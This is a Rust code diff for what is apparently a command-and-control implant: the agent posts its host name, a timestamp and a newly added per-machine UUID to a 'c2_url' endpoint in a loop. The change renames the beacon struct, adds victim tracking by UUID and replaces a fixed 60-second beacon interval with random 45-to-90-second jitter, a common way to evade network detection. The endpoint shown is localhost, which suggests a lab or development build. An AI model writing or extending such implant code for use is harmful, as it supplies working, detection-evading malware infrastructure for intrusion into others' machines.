@@ -1,19 +1,23 @@
+use rand::Rng;
 use reqwest::Client;
 use serde::Serialize;
 use std::{thread, time::Duration};
 use sysinfo::System;
+use uuid::Uuid;
 
 mod sysinfo_saver;
 
 #[derive(Serialize)]
-struct MinimalBeacon {
+struct Beacon {
     timestamp: u64,
     host_name: String,
+    uuid: Uuid,
 }
 
 #[tokio::main]
 async fn main() {
-    sysinfo_saver::save_file();
+    let uuid: Uuid = sysinfo_saver::save_file().expect("Error saving file");
+
     let c2_url = "http://localhost:80/beacon";
     let client = Client::new();
     let mut sys = System::new_all();
@@ -21,9 +25,10 @@ async fn main() {
     loop {
         sys.refresh_all();
 
-        let beacon = MinimalBeacon {
+        let beacon = Beacon {
             timestamp: chrono::Utc::now().timestamp() as u64,
             host_name: System::host_name().unwrap_or_default(),
+            uuid,
         };
 
         let res = client.post(c2_url).json(&beacon).send().await;
@@ -61,6 +66,7 @@ async fn main() {
             }
         }
 
-        thread::sleep(Duration::from_secs(60)); // 60 seconds interval
+        let seconds_to_sleep = rand::thread_rng().gen_range(45..91);
+        thread::sleep(Duration::from_secs(seconds_to_sleep)); // random interval between 45 and 90
     }
 }
